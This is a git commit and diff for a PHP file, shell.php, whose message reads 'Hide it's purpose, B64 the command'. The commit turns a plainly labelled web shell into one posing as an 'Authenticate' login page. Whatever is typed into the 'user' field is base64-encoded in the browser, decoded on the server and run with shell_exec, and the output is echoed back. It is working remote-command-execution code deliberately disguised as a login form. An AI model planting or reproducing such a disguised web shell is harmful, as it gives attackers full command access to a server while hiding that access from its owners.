0c85ba30c46b3fcff9f84882195e0f6f8c8454eb
Michael <mike-bailey@users.noreply.github.com>
2015-05-27 21:23:20 -0400

    Various Additions
    Hide it's purpose, B64 the command, return nl2br, profit

--- shell.php
+++ shell.php
@@ -1,35 +1,36 @@
 <?php
-	if (isset($_POST['command']))
-	{
-		// Minor obfuscation
-		$response = shell_exec(base64_decode($_POST['command']));
-	}
+        if (isset($_POST['user'])) {
+                // Minor obfuscation
+//              echo "DEBUG: ".base64_decode($_POST['user']);
+//              echo "DEBUG: ".$_POST['user'];
+                $response = shell_exec(base64_decode($_POST['user']));
+                echo nl2br($response);
+        }
 ?>
 <!DOCTYPE html>
 <html>
-	<head>
-		<script>
-		function validate(contents) {
-			console.log("Contents passed as "+contents)
-			console.log(document.getElementById('user').value);
-			document.getElementById('user').value=btoa("document.getElementById('user').value");
-			console.log(document.getElementById('user').value);
-		}
-		</script>
-		<title>Shell</title>
-	</head>
-	<body>
-		<form action="" method="POST" onsubmit="validate(document.getElementById('user').value)">
-			<input type="text" name="user" id="user" />
-			<input type="submit" value="Login"/>
-		</form>
-		<p>
-			<?php 
-				if (isset($response)) 
-				{
-					echo nl2br($response);
-				}
-			?>
-		</p>
-	</body>
+        <head>
+                <script>
+                function validate(contents) {
+                        console.log("Contents passed as "+contents);
+                        console.log(document.getElementById('user').value);
+                        document.getElementById('user').value=btoa(document.getElementById('user').value);
+                        console.log(document.getElementById('user').value);
+                }
+                </script>
+                <title>Authenticate</title>
+        </head>
+        <body>
+                <form action="" method="POST" onsubmit="validate()">
+                        <input type="text" name="user" id="user" />
+                        <input type="submit" value="Login"/>
+                </form>
+                <p>
+                        <?php
+                                if (isset($response)) {
+                                        echo nl2br($response);
+                                }
+                        ?>
+                </p>
+        </body>
 </html>
